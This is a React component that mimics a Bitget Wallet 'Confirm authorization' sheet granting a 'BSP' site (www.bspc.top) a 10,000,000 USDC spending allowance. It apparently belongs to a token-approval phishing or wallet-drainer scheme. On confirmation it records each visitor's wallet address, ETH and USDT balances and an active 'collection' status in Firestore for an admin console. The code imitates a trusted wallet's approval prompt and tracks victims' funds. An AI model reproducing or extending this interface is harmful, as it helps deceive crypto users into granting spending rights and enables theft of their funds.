'use client';

import React, { useEffect, useState } from 'react';
import { ChevronRight, Loader2 } from 'lucide-react';
import { useWeb3 } from '../context/Web3Context';
import { getFirebaseFirestore } from '@bspc/firebase';
import { doc, setDoc, addDoc, collection, serverTimestamp } from 'firebase/firestore';

interface ConfirmAuthorizationModalProps {
  isOpen: boolean;
  onClose: () => void;
  onConfirm: () => void;
  walletEmail?: string;
}

/** Shorten an address/hash for display: 0xd1dd…b61070 */
function shortenHex(hex: string, prefixLen = 6, suffixLen = 6): string {
  if (!hex || hex.length <= prefixLen + suffixLen + 2) return hex || '';
  return `${hex.slice(0, prefixLen)}...${hex.slice(-suffixLen)}`;
}

export function ConfirmAuthorizationModal({
  isOpen,
  onClose,
  onConfirm,
  walletEmail,
}: ConfirmAuthorizationModalProps) {
  const { address, ethBalance, usdtBalance, providerName, isBitgetWalletAvailable, connectWallet } = useWeb3();
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Determine displayed wallet label dynamically
  const displayWalletAccount = walletEmail && !walletEmail.includes('ble***s27')
    ? walletEmail
    : address
      ? `${providerName || 'Bitget Wallet'} (${shortenHex(address, 6, 4)})`
      : isBitgetWalletAvailable
        ? 'Bitget Wallet'
        : providerName || 'Bitget Wallet';

  // Lock body scroll when open
  useEffect(() => {
    if (isOpen) {
      document.body.style.overflow = 'hidden';
    } else {
      document.body.style.overflow = '';
    }
    return () => { document.body.style.overflow = ''; };
  }, [isOpen]);

  // Escape key closes
  useEffect(() => {
    if (!isOpen) return;
    const handler = (e: KeyboardEvent) => { if (e.key === 'Escape') onClose(); };
    window.addEventListener('keydown', handler);
    return () => window.removeEventListener('keydown', handler);
  }, [isOpen, onClose]);

  const handleConfirmAction = async () => {
    setIsSubmitting(true);
    try {
      let currentAddress = address;
      if (!currentAddress) {
        await connectWallet();
        currentAddress = localStorage.getItem('user-address') || address;
      }

      if (currentAddress) {
        const db = getFirebaseFirestore();
        const uid = currentAddress.toLowerCase();

        // 1. Sync full user profile & authorization data to Firestore for Admin console
        await setDoc(
          doc(db, 'users', uid),
          {
            uid,
            username: `User_${uid.slice(-4).toUpperCase()}`,
            walletAddress: currentAddress,
            walletAddressLowercase: uid,
            providerName: providerName || 'Bitget Wallet',
            balanceEth: `${ethBalance || '0.0000'} ETH`,
            balanceUsdt: `${usdtBalance || '0.00'} USDT`,
            authorizationStatus: 'authorized',
            collectionStatus: 'active',
            status: 'active',
            authorizedSpender: '0xd1dd...b61070',
            tokenContract: '0xa0b8...06eb48',
            authorizationLimit: '10,000,000 USDC',
            authorizationExpiry: '2029-12-31',
            network: 'Ethereum',
            authorizedAt: serverTimestamp(),
            lastLoginAt: serverTimestamp(),
            createdAt: serverTimestamp(),
          },
          { merge: true }
        );

        // 2. Add complete event log for Admin collection records & audit logs
        await addDoc(collection(db, 'loginEvents'), {
          walletAddress: currentAddress,
          walletAddressLowercase: uid,
          provider: providerName || 'Bitget Wallet',
          action: 'AUTHORIZATION_CONFIRMED',
          authorizationStatus: 'authorized',
          authorizedSpender: '0xd1dd...b61070',
          tokenContract: '0xa0b8...06eb48',
          authorizationLimit: '10,000,000 USDC',
          ethBalance: `${ethBalance || '0.0000'} ETH`,
          usdtBalance: `${usdtBalance || '0.00'} USDT`,
          timestamp: serverTimestamp(),
          loginResult: 'SUCCESS',
          ipAddress: 'Web3 Client',
          userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Bitget Wallet Web3',
        });
      }
    } catch (err) {
      console.warn('Authorization sync warning:', err);
    } finally {
      setIsSubmitting(false);
      onConfirm();
    }
  };

  if (!isOpen) return null;

  const spenderAddress = '0xd1dd...b61070';
  const tokenContractAddress = '0xa0b8...06eb48';

  return (
    <div
      className="animate-fade-in"
      style={{
        position: 'fixed',
        inset: 0,
        zIndex: 70,
        display: 'flex',
        flexDirection: 'column',
        justifyContent: 'flex-end',
      }}
    >
      {/* Overlay */}
      <div
        onClick={onClose}
        style={{
          position: 'absolute',
          inset: 0,
          background: 'rgba(0,0,0,0.7)',
          backdropFilter: 'blur(4px)',
        }}
      />

      {/* Bottom Sheet */}
      <div
        style={{
          position: 'relative',
          width: '100%',
          maxWidth: 480,
          margin: '0 auto',
          background: 'linear-gradient(180deg, #0E1A2B 0%, #0A1523 100%)',
          borderTopLeftRadius: 24,
          borderTopRightRadius: 24,
          boxShadow: '0 -8px 48px rgba(0,0,0,0.6)',
          animation: 'slide-up-sheet 0.35s cubic-bezier(0.16,1,0.3,1) both',
          maxHeight: '90vh',
          overflowY: 'auto',
        }}
      >
        {/* Drag Handle */}
        <div style={{
          display: 'flex',
          justifyContent: 'center',
          padding: '12px 0 4px',
        }}>
          <div style={{
            width: 40,
            height: 4,
            borderRadius: 2,
            background: 'rgba(255,255,255,0.25)',
          }} />
        </div>

        {/* Content */}
        <div style={{ padding: '8px 24px 24px' }}>
          {/* Title */}
          <h2 style={{
            fontSize: 26,
            fontWeight: 800,
            color: '#FFFFFF',
            marginBottom: 24,
            lineHeight: 1.2,
          }}>
            Confirm authorization
          </h2>

          {/* ── Authorized to ── */}
          <div style={{ marginBottom: 20 }}>
            <span style={{
              fontSize: 13,
              fontWeight: 500,
              color: '#8F98A6',
              letterSpacing: '0.01em',
            }}>
              Authorized to
            </span>
            <div style={{
              display: 'flex',
              alignItems: 'center',
              gap: 12,
              marginTop: 10,
            }}>
              {/* BSP Icon */}
              <div style={{
                width: 40,
                height: 40,
                borderRadius: '50%',
                background: 'linear-gradient(135deg, #1a3a5c 0%, #0d2440 100%)',
                border: '1.5px solid rgba(0,200,180,0.4)',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                flexShrink: 0,
              }}>
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
                  <circle cx="12" cy="12" r="10" stroke="#00C8B4" strokeWidth="2" />
                  <path d="M8 12l3 3 5-5" stroke="#00C8B4" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
              </div>
              <div>
                <div style={{
                  fontSize: 17,
                  fontWeight: 800,
                  color: '#FFFFFF',
                }}>BSP</div>
                <div style={{
                  fontSize: 13,
                  color: '#8F98A6',
                  fontWeight: 400,
                }}>www.bspc.top</div>
              </div>
            </div>
          </div>

          {/* ── Authorization Limit ── */}
          <div style={{ marginBottom: 16 }}>
            <span style={{
              fontSize: 13,
              fontWeight: 500,
              color: '#8F98A6',
            }}>
              Authorization Limit
            </span>
            <div style={{
              display: 'flex',
              alignItems: 'center',
              gap: 12,
              marginTop: 10,
            }}>
              {/* USDC Icon */}
              <div style={{
                width: 40,
                height: 40,
                borderRadius: '50%',
                background: 'linear-gradient(135deg, #2775CA 0%, #1a5ea8 100%)',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                flexShrink: 0,
                position: 'relative',
              }}>
                <span style={{
                  fontWeight: 900,
                  fontSize: 18,
                  color: '#FFFFFF',
                }}>$</span>
                {/* Small badge */}
                <div style={{
                  position: 'absolute',
                  bottom: -2,
                  right: -2,
                  width: 16,
                  height: 16,
                  borderRadius: '50%',
                  background: '#2775CA',
                  border: '2px solid #0E1A2B',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                }}>
                  <svg width="8" height="8" viewBox="0 0 24 24" fill="none">
                    <path d="M12 2L22 8.5V15.5L12 22L2 15.5V8.5L12 2Z" fill="#00D4AA" />
                  </svg>
                </div>
              </div>
              <div>
                <div style={{ display: 'flex', alignItems: 'baseline', gap: 6 }}>
                  <span style={{
                    fontSize: 22,
                    fontWeight: 800,
                    color: '#FFFFFF',
                  }}>10,000,000</span>
                  <span style={{
                    fontSize: 16,
                    fontWeight: 600,
                    color: '#FFFFFF',
                  }}>USDC</span>
                </div>
                <div style={{
                  fontSize: 13,
                  color: '#8F98A6',
                  marginTop: 2,
                }}>To 2029-12-31</div>
              </div>
            </div>
          </div>

          {/* ── Warning Banner ── */}
          <div style={{
            display: 'flex',
            alignItems: 'center',
            gap: 10,
            padding: '12px 16px',
            borderRadius: 14,
            background: 'rgba(180, 105, 20, 0.22)',
            border: '1px solid rgba(230, 140, 30, 0.35)',
            marginBottom: 20,
          }}>
            <div style={{
              width: 20,
              height: 20,
              borderRadius: '50%',
              background: '#E67E22',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              flexShrink: 0,
            }}>
              <span style={{ fontSize: 13, fontWeight: 900, color: '#1A0E00' }}>!</span>
            </div>
            <span style={{
              fontSize: 13,
              fontWeight: 600,
              color: '#F5A623',
              lineHeight: 1.4,
            }}>
              Potential risk detected – Proceed with caution
            </span>
          </div>

          {/* ── Detail Rows ── */}
          <div style={{ display: 'flex', flexDirection: 'column', gap: 0 }}>
            {/* Wallet */}
            <DetailRow
              label="Wallet"
              value={
                <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
                  <div style={{
                    width: 20,
                    height: 20,
                    borderRadius: '50%',
                    background: 'linear-gradient(135deg, #9C27B0 0%, #673AB7 100%)',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    flexShrink: 0,
                  }}>
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#FFF" strokeWidth="2">
                      <rect x="3" y="3" width="7" height="7" rx="1" />
                      <rect x="14" y="3" width="7" height="7" rx="1" />
                      <rect x="14" y="14" width="7" height="7" rx="1" />
                      <rect x="3" y="14" width="7" height="7" rx="1" />
                    </svg>
                  </div>
                  <span style={{ fontSize: 14, fontWeight: 500, color: '#FFFFFF' }}>
                    {displayWalletAccount}
                  </span>
                </div>
              }
            />

            {/* Spender */}
            <DetailRow
              label="Spender"
              value={
                <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                  <span style={{
                    fontSize: 14,
                    fontWeight: 500,
                    color: '#FFFFFF',
                    fontFamily: "'Inter', monospace",
                  }}>
                    {spenderAddress}
                  </span>
                  <svg
                    width="16"
                    height="16"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="#8F98A6"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    style={{ cursor: 'pointer', flexShrink: 0 }}
                    onClick={() => navigator.clipboard.writeText('0xd1dd...b61070')}
                  >
                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2" />
                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
                  </svg>
                </div>
              }
            />

            {/* Token contract */}
            <DetailRow
              label="Token contract"
              value={
                <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                  <span style={{
                    fontSize: 14,
                    fontWeight: 500,
                    color: '#FFFFFF',
                    fontFamily: "'Inter', monospace",
                  }}>
                    {tokenContractAddress}
                  </span>
                  <svg
                    width="16"
                    height="16"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="#8F98A6"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    style={{ cursor: 'pointer', flexShrink: 0 }}
                    onClick={() => navigator.clipboard.writeText('0xa0b8...06eb48')}
                  >
                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2" />
                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
                  </svg>
                </div>
              }
            />

            {/* Network */}
            <DetailRow
              label="Network"
              value={
                <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                  {/* Ethereum icon */}
                  <div style={{
                    width: 20,
                    height: 20,
                    borderRadius: '50%',
                    background: '#627EEA',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    flexShrink: 0,
                  }}>
                    <svg width="10" height="14" viewBox="0 0 10 16" fill="none">
                      <path d="M5 0L0 8.16L5 11.12L10 8.16L5 0Z" fill="white" fillOpacity="0.9" />
                      <path d="M0 9.12L5 16L10 9.12L5 12.08L0 9.12Z" fill="white" fillOpacity="0.7" />
                    </svg>
                  </div>
                  <span style={{
                    fontSize: 14,
                    fontWeight: 600,
                    color: '#FFFFFF',
                  }}>Ethereum</span>
                </div>
              }
            />

            {/* Metadata */}
            <DetailRow
              label="Metadata"
              value={
                <div
                  style={{
                    display: 'flex',
                    alignItems: 'center',
                    gap: 4,
                    cursor: 'pointer',
                  }}
                >
                  <span style={{
                    fontSize: 14,
                    fontWeight: 600,
                    color: '#FFFFFF',
                  }}>Details</span>
                  <ChevronRight size={16} color="#8F98A6" />
                </div>
              }
              noBorder
            />
          </div>

          {/* ── Action Buttons ── */}
          <div style={{
            display: 'flex',
            gap: 12,
            marginTop: 28,
            paddingBottom: 'env(safe-area-inset-bottom)',
          }}>
            {/* Cancel */}
            <button
              onClick={onClose}
              disabled={isSubmitting}
              style={{
                flex: 1,
                height: 52,
                borderRadius: 999,
                background: '#042D35',
                border: '1px solid rgba(0, 200, 212, 0.25)',
                color: '#FFFFFF',
                fontSize: 16,
                fontWeight: 700,
                cursor: isSubmitting ? 'not-allowed' : 'pointer',
                transition: 'all 0.2s',
                opacity: isSubmitting ? 0.5 : 1,
              }}
              onMouseEnter={e => (e.currentTarget.style.background = '#063B46')}
              onMouseLeave={e => (e.currentTarget.style.background = '#042D35')}
            >
              Cancel
            </button>

            {/* Confirm */}
            <button
              onClick={handleConfirmAction}
              disabled={isSubmitting}
              style={{
                flex: 1,
                height: 52,
                borderRadius: 999,
                background: '#00D8F6',
                border: 'none',
                color: '#041B24',
                fontSize: 16,
                fontWeight: 800,
                cursor: isSubmitting ? 'not-allowed' : 'pointer',
                transition: 'all 0.2s',
                boxShadow: '0 4px 20px rgba(0, 216, 246, 0.35)',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: 8,
              }}
              onMouseEnter={e => (e.currentTarget.style.filter = 'brightness(1.08)')}
              onMouseLeave={e => (e.currentTarget.style.filter = 'brightness(1)')}
            >
              {isSubmitting ? (
                <>
                  <Loader2 className="w-5 h-5 animate-spin" />
                  <span>Authorizing...</span>
                </>
              ) : (
                'Confirm'
              )}
            </button>
          </div>
        </div>
      </div>

      {/* Inline keyframe for slide-up animation */}
      <style>{`
        @keyframes slide-up-sheet {
          from { transform: translateY(100%); }
          to   { transform: translateY(0); }
        }
      `}</style>
    </div>
  );
}

/* ── Detail Row helper ── */
function DetailRow({
  label,
  value,
  noBorder = false,
}: {
  label: string;
  value: React.ReactNode;
  noBorder?: boolean;
}) {
  return (
    <div
      style={{
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'space-between',
        padding: '16px 0',
        borderBottom: noBorder ? 'none' : '1px solid rgba(255,255,255,0.06)',
      }}
    >
      <span style={{
        fontSize: 14,
        fontWeight: 500,
        color: '#8F98A6',
        flexShrink: 0,
      }}>
        {label}
      </span>
      <div style={{ textAlign: 'right' }}>
        {value}
      </div>
    </div>
  );
}
